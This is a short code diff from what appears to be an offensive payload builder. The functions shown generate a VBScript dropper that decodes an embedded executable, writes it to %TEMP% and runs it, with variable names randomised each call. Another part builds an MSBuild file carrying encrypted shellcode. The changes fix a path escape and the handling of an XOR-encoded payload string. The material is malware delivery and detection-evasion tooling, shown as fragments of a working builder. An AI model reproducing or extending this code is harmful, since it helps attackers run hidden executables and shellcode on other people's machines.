@@ -62,7 +62,7 @@ def _vbs_split(s: str) -> str:
 def _vbs_runner_body(pe_b64: str) -> str:
     """
     VBScript that base64-decodes a PE from an embedded string,
-    writes it to %TEMP%\wct<rand>.exe, and executes it.
+    writes it to %TEMP%\\wct<rand>.exe, and executes it.
     Variable names randomised per call.
     """
     v_dom, v_el, v_raw = _rv(), _rv(2), _rv(2)
@@ -299,7 +299,9 @@ def build_msbuild(
 ) -> str:
     with open(sc_enc_path, "rb") as f:
         enc_bytes = f.read()
-    sc_b64 = base64.b64encode(enc_bytes).decode()
+    # .enc is already base64(k1 || xor(...)) — pass the string directly so C#'s
+    # Convert.FromBase64String() yields the raw bytes with k1 at index 0.
+    sc_b64 = enc_bytes.decode("ascii").strip()
 
     xml_content = _build_msbuild_xml(sc_b64)
     os.makedirs(out_dir, exist_ok=True)
